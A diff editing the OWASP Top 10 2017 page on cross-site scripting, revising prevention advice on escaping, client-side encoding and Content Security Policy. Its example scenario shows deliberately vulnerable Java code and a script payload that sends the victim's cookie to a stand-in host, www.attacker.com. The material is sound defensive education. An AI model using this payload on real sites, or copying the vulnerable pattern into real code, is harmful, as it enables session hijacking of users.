@@ -8,20 +8,21 @@
 ## Am I vulnerable to attack?
 
 You are vulnerable to Server XSS if your server-side code uses user-supplied input as part of the HTML output, and you don’t use context-sensitive escaping to ensure it cannot run. If a web page uses JavaScript to dynamically add attacker-controllable data to a page, you may have Client XSS. Ideally, you would avoid sending attacker-controllable data to unsafe JavaScript APIs, but escaping (and to a lesser extent) input validation can be used to make this safe.
-Automated tools can find some XSS problems automatically. 
 
-However, each application builds output pages differently and uses different browser side interpreters such as JavaScript, ActiveX, Flash, and Silverlight, usually using 3rd party libraries built on top of these technologies. This diveristy makes automated detection difficult, particularly when using modern single-page applications and powerful JavaScript frameworks and libraries. Therefore, complete coverage requires a combination of manual code review and penetration testing, in addition to automated approaches.
+Automated tools can find some XSS problems automatically. 
+However, each application builds output pages differently and uses different browser side interpreters such as JavaScript, ActiveX, Flash, and Silverlight, usually using 3rd party libraries built on top of these technologies. 
+This diveristy makes automated detection difficult, particularly when using modern single-page applications and powerful JavaScript frameworks and libraries. 
+Therefore, complete coverage requires a combination of manual code review and penetration testing, in addition to automated approaches.
 
 ## How do I prevent
 
 Preventing XSS requires separation of untrusted data from active browser content.
 
-To avoid Server XSS, the preferred option is to properly escape untrusted data based on the HTML context (body, attribute, JavaScript, CSS, or URL) that the data will be placed into. See the OWASP XSS Prevention Cheat Sheet for details on the required data escaping techniques.
+1. Escaping untrusted HTTP request data based on the context in the HTML output (body, attribute, JavaScript, CSS, or URL) will resolve [Server XSS](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting#Server_XSS) vulnerabilities. The [OWASP XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) has details on the required data escaping techniques.
 
-To avoid Client XSS, the preferred option is to avoid passing untrusted data to JavaScript and other browser APIs that can generate active content. When this cannot be avoided, similar context sensitive escaping techniques can be applied to browser APIs as described in the OWASP DOM based XSS Prevention Cheat Sheet.
+2. Applying context sensitive encoding when modifying the browser document on the client side acts against [client XSS](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting#Client_XSS). When this cannot be avoided, similar context sensitive escaping techniques can be applied to browser APIs as described in the [OWASP DOM based XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet).
 
-For rich content, consider auto-sanitization libraries like OWASP’s AntiSamy or the Java HTML Sanitizer Project.
-Use [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) (CSP) to mitigate the impact of potential XSS across your entire site.
+3. Enabling a [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)) (CSP) and moving inline javascript code to additional files will defend against XSS across the entire site, assuming no other vulnerabilities (such as upload path tampering or download path traversal) exist that would allow placing malicious code in the server files.
 
 ## Example Scenarios
 
@@ -29,12 +30,12 @@ The application uses untrusted data in the construction of the following HTML sn
 
 `(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
 
-The attacker modifies the ‘CC’ parameter in his browser to:
+The attacker manipulates the ‘CC’ parameter in his browser to:
 
 `'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`
 
 This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session. 
-Note that attackers can also use XSS to defeat any  automated CSRF defense the application might employ. See 2017-A8 for info on CSRF.
+Note that attackers can also use XSS to defeat any automated CSRF defense the application might employ. See 2017-A8 for information on CSRF.
 
 ## References
 
